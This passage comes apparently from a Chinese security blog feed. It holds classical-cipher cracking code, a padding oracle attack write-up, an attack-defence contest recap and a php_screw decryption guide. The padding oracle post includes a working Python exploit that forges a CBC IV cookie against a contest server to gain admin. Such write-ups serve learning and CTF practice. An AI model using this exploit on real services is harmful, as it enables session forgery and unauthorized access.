class="line"></div><div class="line">def get_Express(c,k3,k2):</div><div class="line">e = &quot;&quot;</div><div class="line">for i in c:</div><div class="line">if ord(i)&gt;=97:</div><div class="line">e += chr(k3*(ord(i)-97-k2)%26+97)</div><div class="line">else:</div><div class="line">e += chr(k3*(ord(i)-65-k2)%26+65)</div><div class="line">return e</div><div class="line"></div><div class="line">def baopo_code(c):</div><div class="line">key1 = [1, 3, 5, 7, 9, 11, 15, 17, 19, 21, 23, 25]</div><div class="line">for k1 in key1:</div><div class="line">k3 = get_k3(k1)</div><div class="line">for k2 in range(0,26):</div><div class="line">result = &quot;&quot;</div><div class="line">for i in c:</div><div class="line">if ord(i)&gt;=97:</div><div class="line">result += chr(k3*(ord(i)-97-k2)%26+97)</div><div class="line">else:</div><div class="line">result += chr(k3 * (ord(i) - 65 - k2) % 26 + 65)</div><div class="line">print k1,&quot; &quot;,k2,&quot; &quot;,result,&quot;\n&quot;</div><div class="line"></div><div class="line">k1 = int(raw_input(&quot;get key1:&quot;))</div><div class="line">k2 = int(raw_input(&quot;get key2:&quot;))</div><div class="line">m = raw_input(&quot;get m:&quot;)</div><div class="line">k3 = get_k3(k1)</div><div class="line">c = get_code(m,k1,k2)</div><div class="line">print c,&quot;\n&quot;</div><div class="line">k1 = int(raw_input(&quot;get key1:&quot;))</div><div class="line">k2 = int(raw_input(&quot;get key2:&quot;))</div><div class="line">k3 = get_k3(k1)</div><div class="line">e = get_Express(c,k3,k2)</div><div class="line">print k3,&quot; &quot;,e,&quot;\n&quot;</div><div class="line">#print c,&quot;\n&quot;</div><div class="line">baopo_code(c)</div></pre></td></tr></table></figure><h2 id="维吉尼亚密码"><a href="#维吉尼亚密码" class="headerlink" title="维吉尼亚密码"></a>维吉尼亚密码</h2><h3 id="加密解密"><a href="#加密解密" class="headerlink" title="加密解密"></a>加密解密</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">def get_code(m,key):</div><div class="line">    keylist = list(key)</div><div class="line">    mlist = list(m)</div><div class="line">    c = &quot;&quot;</div><div class="line">    for i in range(0, len(m)):</div><div class="line">        j = ord(mlist[i])-97+ord(keylist[i])</div><div class="line">        if j &gt; 122:</div><div class="line">            c += chr(j-26)</div><div class="line">        else:</div><div class="line">            c += chr(j)</div><div class="line">    return c</div><div class="line"></div><div class="line">def get_m(key,c):</div><div class="line">    keylist = list(key)</div><div class="line">    clist = list(c)</div><div class="line">    m = &quot;&quot;</div><div class="line">    for i in range(0,len(c)):</div><div class="line">        if ord(keylist[i]) &gt; ord(clist[i]):</div><div class="line">            j = 122-ord(keylist[i])+1+ord(clist[i])-97</div><div class="line">            m += chr(j+97)</div><div class="line">        else:</div><div class="line">            j = ord(clist[i])-ord(keylist[i])</div><div class="line">            m += chr(j+97)</div><div class="line">    return m</div><div class="line"></div><div class="line">m = raw_input(&quot;input m:&quot;)</div><div class="line">key = raw_input(&quot;input key:&quot;)</div><div class="line">k1 = key</div><div class="line">while len(m) &gt; len(key):</div><div class="line">    key += k1</div><div class="line">c = get_code(m,key)</div><div class="line">print c</div><div class="line">key = raw_input(&quot;input key:&quot;)</div><div class="line">k1 = key</div><div class="line">while len(c) &gt; len(key):</div><div class="line">    key += k1</div><div class="line">m = get_m(key,c)</div><div class="line">print m</div></pre></td></tr></table></figure><h3 id="维密文攻击（基于重合互指数法）"><a href="#维密文攻击（基于重合互指数法）" class="headerlink" title="维密文攻击（基于重合互指数法）"></a>维密文攻击（基于重合互指数法）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div></pre></td><td class="code"><pre><div class="line">from __future__ import division</div><div class="line">c = &quot;CHREEVOAHMAERATBIAXXWTNXBEEOPHBSBQMQEQERBWRVXUOAKXAOSXXWEAHBWGJMMQMNKGRFVGXWTRZXWIAKLXFPSKAUTEMNDCMGTSXMXBTUIADNGMGPSRELXNJELXVRVPRTULHDNQWTWDTYGBPHXTFALJHASVBFXNGLLCHRZBWELEKMSJIKNBHWRJGNMGJSGLXFEYPHAGNRBIEQJTAMRVLCRREMNDGLXRRIMGNSNRWCHRQHAEYEVTAQEBBIPEEWEVKAKOEWADREMXMTBJJCHRTKDNVRZCHRCLQOHPWQAIIWXNRMGWOIIFKEE&quot;</div><div class="line">#c = input(&quot;input code:&quot;)</div><div class="line">dict = &#123;&apos;A&apos;:0.082,&apos;B&apos;:0.015,&apos;C&apos;:0.028,&apos;D&apos;:0.043,&apos;E&apos;:0.127,&apos;F&apos;:0.022,&apos;G&apos;:0.02,&apos;H&apos;:0.061,&apos;I&apos;:0.07,&apos;J&apos;:0.002,&apos;K&apos;:0.008,&apos;L&apos;:0.04,&apos;M&apos;:0.024,&apos;N&apos;:0.067,&apos;O&apos;:0.075,&apos;P&apos;:0.019,&apos;Q&apos;:0.001,&apos;R&apos;:0.060,&apos;S&apos;:0.063,&apos;T&apos;:0.091,&apos;U&apos;:0.028,&apos;V&apos;:0.010,&apos;W&apos;:0.023,&apos;X&apos;:0.001,&apos;Y&apos;:0.020,&apos;Z&apos;:0.001&#125;</div><div class="line"></div><div class="line">def get_len(c):</div><div class="line">    sumlist = []</div><div class="line">    for d in range(1, 7):</div><div class="line">        list = []</div><div class="line">        for i in range(0, d):</div><div class="line">            list1 = c[i::d]</div><div class="line">            list.append(list1)</div><div class="line">        pjsum = 0</div><div class="line">        for i in range(0, d):</div><div class="line">            list2 = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]</div><div class="line">            for w in list[i]:</div><div class="line">                num = ord(w) - 65</div><div class="line">                list2[num] += 1</div><div class="line">            sum1 = 0</div><div class="line">            for j in range(0, 26):</div><div class="line">                sum1 += list2[j] * (list2[j] - 1)</div><div class="line">            sum2 = len(list[i]) * (len(list[i]))</div><div class="line">            sum = sum1 / sum2</div><div class="line">            pjsum += sum</div><div class="line">        pjsum = pjsum / d</div><div class="line">        sumlist.append(pjsum)</div><div class="line">    min = 1</div><div class="line">    dm = 0</div><div class="line">    for d in range(0, 6):</div><div class="line">        if sumlist[d] &lt; 0.065:</div><div class="line">            sumlist[d] = 0.065 - sumlist[d]</div><div class="line">        else:</div><div class="line">            sumlist[d] = sumlist[d] - 0.065</div><div class="line">        if min &gt; sumlist[d]:</div><div class="line">            min = sumlist[d]</div><div class="line">            dm = d</div><div class="line">    return dm + 1</div><div class="line"></div><div class="line">def get_key(d):</div><div class="line">    key = &quot;&quot;</div><div class="line">    listd = []</div><div class="line">    for i in range(0,d):</div><div class="line">        zd = c[i::d]</div><div class="line">        listd.append(zd)</div><div class="line">    for i in range(0,d):</div><div class="line">        listp = []</div><div class="line">        listabsp = []</div><div class="line">        for j in range(0,26):</div><div class="line">            p = 0.0</div><div class="line">            for k in range(65,91):</div><div class="line">                p = p + float(listd[i].count(chr((k-65+j)%26+65))*dict[chr(k)])/float(len(listd[i]))</div><div class="line">            listp.append(p)</div><div class="line">        for n in range(0,listp.__len__()):</div><div class="line">            absp = abs(listp[n]-0.065)</div><div class="line">            listabsp.append(absp)</div><div class="line">        key += chr(listabsp.index(min(listabsp))+65)</div><div class="line">    return key</div><div class="line"></div><div class="line">def get_m(key,c):</div><div class="line">    keylist = list(key)</div><div class="line">    clist = list(c)</div><div class="line">    m = &quot;&quot;</div><div class="line">    for i in range(0,len(c)):</div><div class="line">        if ord(keylist[i]) &gt; ord(clist[i]):</div><div class="line">            j = 122-ord(keylist[i])+1+ord(clist[i])-97</div><div class="line">            m += chr(j+97)</div><div class="line">        else:</div><div class="line">            j = ord(clist[i])-ord(keylist[i])</div><div class="line">            m += chr(j+97)</div><div class="line">    return m</div><div class="line"></div><div class="line">lenk = get_len(c)</div><div class="line">#print &quot;密钥长度为:&quot;,lenk</div><div class="line">key = get_key(lenk)</div><div class="line">k1 = key</div><div class="line">while len(c) &gt; len(key):</div><div class="line">    key += k1</div><div class="line">key = key.lower()</div><div class="line">c = c.lower()</div><div class="line">m = get_m(key,c)</div><div class="line">print m</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;仿射密码-加密，解密，暴力破解&quot;&gt;&lt;a href=&quot;#仿射密码-加密，解密，暴力破解&quot; class=&quot;headerlink&quot; title=&quot;仿射密码(加密，解密，暴力破解)&quot;&gt;&lt;/a&gt;仿射密码(加密，解密，暴力破解)&lt;/h2&gt;&lt;figure class=&quot;high
      
    
    </summary>
    
      <category term="Crypto" scheme="http://yoursite.com/categories/Crypto/"/>
    
    
      <category term="密码学课程设计" scheme="http://yoursite.com/tags/%E5%AF%86%E7%A0%81%E5%AD%A6%E8%AF%BE%E7%A8%8B%E8%AE%BE%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Padding Oracle Attack</title>
    <link href="http://yoursite.com/2017/12/16/Padding-Oracle-Attack/"/>
    <id>http://yoursite.com/2017/12/16/Padding-Oracle-Attack/</id>
    <published>2017-12-16T12:07:33.000Z</published>
    <updated>2017-12-18T01:36:30.579Z</updated>
    
    <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>在密码学中，分组密码（Block cipher），是一种对称密钥算法。先将明文分成多个等长的块，再进行加密。cbc模式中，每个明文块先于前一个密文块进行异或后，再加密，加密过程：</p><p><img src="/uploads/aes-cbc.jpg" alt="cbc"></p><p>值得注意的是如果最后一个分组长度没有达到模块大小，就需要填充一些字节达到模块大小，以16字节为例，如果明文是leesinc1，长度为八个字节，剩下的八个字节均填充为0x08，填充的值等于需要填充的字节长度。</p><p>上图给出了加密过程，解密过程大致可以看成是逆操作。加密过程是先将明文和IV异或，再把结果进行AES加密得到密文。解密过程是先进行AES解密，再把结果和IV进行异或得到明文。解密完成以后，如果填充的字节不正确，程序往往会抛出异常（这里没有必要担心明文是否正确），根据回显可判断填充的字节是否正确，这是Padding Oracle Attack的前提。</p><h3 id="如何攻击"><a href="#如何攻击" class="headerlink" title="如何攻击"></a>如何攻击</h3><p>在攻击者可以控制IV的前提下可以进行攻击.我们假设经过AES解密后密文为（还没有与IV异或）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">middle(hex):52ee9dc1bdafbfd4a7b835b47d183e5f</div></pre></td></tr></table></figure><p>我们假设只填充了一个字节,则明文结尾为0x01才不会抛出异常,我们设IV（IV是我们可以控制的）为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">IV(hex):00000000000000000000000000000000</div></pre></td></tr></table></figure><p>此时IV和middle异或的结果为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">明文(hex):52ee9dc1bdafbfd4a7b835b47d183e5f</div></pre></td></tr></table></figure><p>结尾不是0x01所以程序会抛出异常。因为middle是固定的（实际上我们并不知道middle的值）,所以在0x00到0xFF之间，只可能有一个值与middle最后有个字节异或后,结果是0x01,所以可以通过遍历这255个值找出IV需要的最后一个字节。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">IV(hex):0000000000000000000000000000005e</div></pre></td></tr></table></figure><p>异或结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">明文(hex):52ee9dc1bdafbfd4a7b835b47d183e01</div></pre></td></tr></table></figure><p>不会抛出异常，此时根据异或的性质，我们已经分别知道IV和明文的最后一个字节分别为0x5e和0x01，把它们进行xor（异或），就可以得到middle的最后一个值0x5f。然后就可以继续推导剩下的middle，当填充为两个字节时，其值为0x02,0x02。而根据前面的推导已经知道了middle的最后一个字节为0x5f，而我们要求明文的最后一位为0x02，所以要更新IV的最后一个字节为0x5f^0x02=0x5d，再进行遍历IV倒数第二个字节。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">IV(hex):00000000000000000000000000003c5d</div><div class="line">明文(hex):52ee9dc1bdafbfd4a7b835b47d180202</div></pre></td></tr></table></figure><p>可得出middle的倒数第二个字节为0x3c^0x02=0x3e。这样最后可以得到所有的middle。</p><p>得到middle后，与原来的IV进行异或，便可以得到明文。在整个过程中只用到了IV和未知的密文，便得到了明文。在获得middle后，还可以根据改变IV，使明文解密为任意明文。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">原明文 ^ 原IV = middle</div><div class="line">新明文 ^ 新IV = middle</div><div class="line">so: 原明文 ^ 原IV ^ 新明文 = 新IV</div></pre></td></tr></table></figure><h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://39.106.159.230:50001/</div></pre></td></tr></table></figure><p>源码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">function get_token()&#123;</div><div class="line">    $random_token = &apos;&apos;;</div><div class="line">    $str = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890&quot;;</div><div class="line">    for($i = 0; $i &lt; 16; $i++)&#123;</div><div class="line">        $random_token .= substr($str, rand(1, 61), 1);</div><div class="line">    &#125;</div><div class="line">    return $random_token;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>随机生成一个16位的taken</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">global $plain;</div><div class="line">    $token = get_token();</div><div class="line">    $c = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token);</div><div class="line">    $_SESSION[&apos;plain&apos;] = base64_encode($c);</div><div class="line">    setcookie(&quot;token&quot;, base64_encode($token));</div></pre></td></tr></table></figure><p>定义了一个全局变量$plain，把$plain和随机生成的taken一起进行加密,加密模式为”aes-128cbc”,再把结果进行base64编码放进session中$plain变量进行身份验证,把$taken进行base64编码之后放入cookie中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">if (isset($_SESSION[&apos;plain&apos;])) &#123;</div><div class="line">    $c = base64_decode($_SESSION[&apos;plain&apos;]);</div><div class="line">    $token = base64_decode($_COOKIE[&quot;token&quot;]);</div><div class="line">    if($dec = openssl_decrypt($c, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $token))</div><div class="line">    &#123;</div><div class="line">        if ($dec === &apos;admin&apos;) </div><div class="line">        &#123;</div><div class="line">            $_SESSION[&apos;isadmin&apos;] = 1;</div><div class="line">            return 1;</div><div class="line">        &#125;</div><div class="line">    &#125;</div></pre></td></tr></table></figure><p>把session中的$plain取出来解码之后，和解码之后的taken一起解密，如果解密之后字符串是”admin”，就把isadmin置1，就可得到flag。</p><p>$plain初始值不知道，在这种情况把$plain加密解密之后让它等于admin，而且taken是我们知道并且可以控制的，这时候就可以用到上面的攻击方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line">import base64</div><div class="line">url = &apos;http://39.106.159.230:50001/&apos;</div><div class="line">N = 16</div><div class="line">def inject_token(token):</div><div class="line">    cookie = &#123;&quot;token&quot;: token&#125;</div><div class="line">    result = s.get(url, cookies = cookie)</div><div class="line">    return result</div><div class="line">def xor(a, b):</div><div class="line">    return &quot;&quot;.join([chr(ord(a[i]) ^ ord(b[i%len(b)])) for i in xrange(len(a))])</div><div class="line">def pad(string, N):</div><div class="line">    l = len(string)</div><div class="line">    if l != N:</div><div class="line">        return string + chr(N-l) * (N-l)</div><div class="line">def padding_oracle(N):</div><div class="line">    get = &quot;&quot;</div><div class="line">    for i in xrange(1, N):</div><div class="line">        for j in xrange(0, 256):</div><div class="line">            padding = xor(get, chr(i) * (i - 1))</div><div class="line">            c=chr(0) * (16 - i) + chr(j) + padding</div><div class="line">            result = inject_token(base64.b64encode(c))</div><div class="line">            if &quot;&lt;html&gt;&quot; in result.content:</div><div class="line">                get = chr(j^i) + get</div><div class="line">                break</div><div class="line">    return get</div><div class="line">data=&#123;&apos;username&apos;: &quot;admin&quot;, &apos;password&apos;: &apos;admin&apos;&#125;</div><div class="line">while 1:</div><div class="line">    s = requests.session()</div><div class="line">    cookies = s.post(url, data = data, allow_redirects = False).headers[&apos;Set-Cookie&apos;].split(&apos;,&apos;) #获得session和token</div><div class="line">    session = cookies[0].split(&quot;;&quot;)[0][10:]</div><div class="line">    token = cookies[1][6:].replace(&quot;%3D&quot;,&apos;=&apos;).replace(&quot;%2F&quot;,&apos;/&apos;).replace(&quot;%2B&quot;,&apos;+&apos;).decode(&apos;base64&apos;)</div><div class="line">    middle1 = padding_oracle(N)</div><div class="line">    print &quot;\n&quot;</div><div class="line">    if(len(middle1) + 1 == 16):</div><div class="line">        for i in xrange(0, 256):</div><div class="line">            middle = chr(i) + middle1   #padding_oracle只能得到15位，爆破第一位</div><div class="line">            plaintext = xor(middle, token);</div><div class="line">            des = pad(&apos;admin&apos;, N)</div><div class="line">            tmp = &quot;&quot;</div><div class="line">            for i in xrange(16):</div><div class="line">                tmp += chr(ord(token[i]) ^ ord(plaintext[i]) ^ ord(des[i]))</div><div class="line">            result = inject_token(base64.b64encode(tmp))</div><div class="line">            if &quot;cumtctf&quot; in result.content:</div><div class="line">                print result.content</div><div class="line">                exit()</div></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这种攻击方式和cbc字节翻转攻击类似，之前在一叶飘零大佬的blog上看过cbc字节翻转攻击的介绍，这两种攻击相似之处在于都是通过一个可控的$taken与密文异或之后改变明文的值。</p><p><a href="http://skysec.top/2017/06/16/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/" target="_blank" rel="external">cbc字节翻转攻击</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h2&gt;&lt;p&gt;在密码学中，分组密码（Block cipher），是一种对称密钥算法。先将明文分成多个等长的块，再进行加密。cbc模式中，每个明文块先于前一
      
    
    </summary>
    
      <category term="Crypto" scheme="http://yoursite.com/categories/Crypto/"/>
    
    
      <category term="cbc" scheme="http://yoursite.com/tags/cbc/"/>
    
      <category term="Padding Oracle" scheme="http://yoursite.com/tags/Padding-Oracle/"/>
    
  </entry>
  
  <entry>
    <title>武汉MAIC线下攻防</title>
    <link href="http://yoursite.com/2017/12/11/%E6%AD%A6%E6%B1%89MAIC%E7%BA%BF%E4%B8%8B%E6%94%BB%E9%98%B2/"/>
    <id>http://yoursite.com/2017/12/11/武汉MAIC线下攻防/</id>
    <published>2017-12-11T12:04:13.000Z</published>
    <updated>2017-12-11T14:25:13.454Z</updated>
    
    <content type="html"><![CDATA[<h2 id="比赛经过"><a href="#比赛经过" class="headerlink" title="比赛经过"></a>比赛经过</h2><p>比赛已经结束一周，突然觉得好像有必要写点总结（被大佬们打得头皮发麻。。。）。软件工程考试前三天，接到通知说要去线下比赛，刚开始还是很高兴，毕竟第一次打线下比赛（虽然这个比赛很水，真的大佬们都没来）</p><p>因为第一次打线下，而且也是第一次接触攻防赛，比赛之前向学校的大佬们了解一些awd的套路，我们在比赛之前也做了很多的准备<br>。</p><p>比赛当天，主办方把所有队伍分成AB两组，在两个机房同时进行比赛，我们在B组。提供了两个linux系统，一个作为攻击机，一个作为靶机（两台机器的linux版本都比较老），而且最要命的是我们带的电脑根本无法连上攻击机和靶机，只能通过虚拟桌面控制攻击机和靶机，而且每台机器同一时间只能有一名队员使用（还有这种操作？？？喵喵喵？第三名队员做什么？？？），顿时心态炸了，我们准备的所有东西都用不上。</p><p>第一轮比赛原计划是8点就开始的，但是我们B组后面的几个队伍都打不开虚拟机，别人都已经开始操作了，我们还一脸懵逼的状态，去问技术客服到底什么情况，他们说正在处理，哇，还有这种操作的吗？？？（不得不吐槽一下了，蓝盾这个公司到底怎么回事，弄个比赛总是出问题，从初赛第一轮开始，第一轮打到一半，平台挂了？？？删库跑路？？？然后道歉比赛推迟一周，初赛很水就算了，可这是决赛啊）然后这种情况持续了很久，中途我们也一直在问技术，技术也没办法，说先把我们ip关了，不让其他队伍打我们靶机（到底关没关也不知道），这种情况一共持续了40分钟，最后20分钟终于好了，我们连上靶机，先把文件全都下攻击机上，然后再改密码，可是我找了半天发现靶机和攻击机上没有一个文本编辑器，这又是什么操作？D盾不能扫漏洞，我自己审计代码都不让？然后用cat命令看了一下开了哪些端口服务，什么都没有做，第一轮就结束了。</p><p>第二轮换题了（后来给执念于心大佬说这事，大佬表示很惊讶），是个博客框架，我们按照第一轮的套路，先备份文件，改密码，这一轮终于有了文本编辑器，想到这种环境，主办方应该会预留一些一句话后门，审了半天找到一个，直接注释掉，然后发现了一个后门的php文件我脑子一热，直接删掉了（结束以后才想到我们一直没有宕机，所以check是假的？），当我们做完这一切的时候剩的时间也不多了，在攻击机上我发现有c刀，但是很奇怪后缀是.exe，也打不开。以前都是在windows上用的c刀，搞了半天也没连上，估计别人早都把洞补上了吧，毕竟我们这么菜。</p><p>第三轮是个cms，上来找到两个sql注入的洞，第一个没有正确过滤get_ip参数，第二个过滤关键字的时候直接把关键字替换成空格，第一个洞我们把参数改了，然后函数无法执行，第二个我们没想到好的方法，就选择把关键字过滤了两次，然后我们开始burp抓包写payload，尝试攻击其他队，但这个时候所有队伍突然都连不上虚拟机（又开始了？），一直持续了10多分钟，然后叫我换ip访问，重新连上之后，赶紧把包发出去，发现那个队的页面无法访问，主页面报错，我们又发现我们的flag被改了，大佬们好强，flag文件只能读不能改，大佬们居然改成功了，然后我们又开始找洞，过了一会儿所有队又连不上，很迷，持续了几分钟，结束前5五分钟，找到了一个大马，赶紧删掉。</p><h2 id="比赛感悟"><a href="#比赛感悟" class="headerlink" title="比赛感悟"></a>比赛感悟</h2><p>第一次，感悟很多，我们做的很差，一直在被动挨打，主要原因还是在自身，对于linux系统的不熟练吃了很多亏，这次比赛没有pwn，全是web，自己很菜，不会写脚本，对于漏洞的如何利用反应很慢，代码审计没有技巧，对于工具的运用不熟练。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>考试周过完了，发现以前自己学得很乱，立个flag吧，每周一篇博客，明确自己在干什么。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;比赛经过&quot;&gt;&lt;a href=&quot;#比赛经过&quot; class=&quot;headerlink&quot; title=&quot;比赛经过&quot;&gt;&lt;/a&gt;比赛经过&lt;/h2&gt;&lt;p&gt;比赛已经结束一周，突然觉得好像有必要写点总结（被大佬们打得头皮发麻。。。）。软件工程考试前三天，接到通知说要去线下比赛，刚开
      
    
    </summary>
    
      <category term="awd" scheme="http://yoursite.com/categories/awd/"/>
    
    
      <category term="awd" scheme="http://yoursite.com/tags/awd/"/>
    
  </entry>
  
  <entry>
    <title>php_screw解密</title>
    <link href="http://yoursite.com/2017/11/05/php-screw%E8%A7%A3%E5%AF%86/"/>
    <id>http://yoursite.com/2017/11/05/php-screw解密/</id>
    <published>2017-11-05T08:38:46.000Z</published>
    <updated>2017-11-05T09:00:02.654Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h1><p>最近练习ctf遇到一道php_screw加密的题目，百度一圈在线解的话需要收费（每次遇到收费解密的题，很烦有木有）。最后在github上找到一个解密的脚本，这里结合这道题说一下使用方法。</p><p><a href="https://github.com/amor-tsai/php_screw" target="_blank" rel="external">项目链接</a></p><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><p>项目要求要求php环境，版本5.x，并要求zlib支持，我的php是5.6。打开文件夹，在tools目录下运行make指令会生成两个可执行文件。screw用来加密，screwd用来解密。在文件夹中有两个文件，一个是my_screw.h，另一个是php_screw.h。</p><h2 id="php-screw-h"><a href="#php-screw-h" class="headerlink" title="php_screw.h"></a>php_screw.h</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">#define PM9SCREW             &quot;\tPM9SCREW\t&quot;</div><div class="line">#define PM9SCREW_LEN         10</div></pre></td></tr></table></figure><p>如果不改这个文件，你加密的文件内容开头就会有 PM9SCREW ，你复制到google搜索下就知道是用screw模块加密的，所以可以对其进行修改隐藏加密算法。</p><h2 id="my-screw-h"><a href="#my-screw-h" class="headerlink" title="my_screw.h"></a>my_screw.h</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">short pm9screw_mycryptkey[] = &#123;</div><div class="line"> 11152, 368, 192, 1281, 62</div><div class="line">&#125;;</div></pre></td></tr></table></figure><p>加密密钥，修改文件里面的数组文件，可以用数字添 加该数组的长度。数组越长，加密越可靠。而且该数组的长度不会影响加密以及你的PHP程序执行的速度，但是最好不要超过五位。</p><h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><p>index.php.bak源码下载，并且在index.php的源码里面发现了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;!--The #define is xxooaa and LEN is 6--&gt;</div><div class="line">&lt;!--The crypt key is &#123;11132, 468, 392, 1281, 62&#125;--&gt;</div></pre></td></tr></table></figure></p><p>按照上面写的，修改my_screw.h和php_screw.h两个文件。</p><p>然后在tools目录下再进行解密<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./screwd index.php</div></pre></td></tr></table></figure></p><p>解密后的文件名在原先文件后加.src后缀</p><p>同样你也可以进行你想要的加密</p><h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><p>最后说一下phpjiami，这里只能Orz大佬</p><p><a href="https://www.leavesongs.com/PENETRATION/unobfuscated-phpjiami.html" target="_blank" rel="external">链接</a></p>]]></content>
    
    <summary type="html">
    
      
      
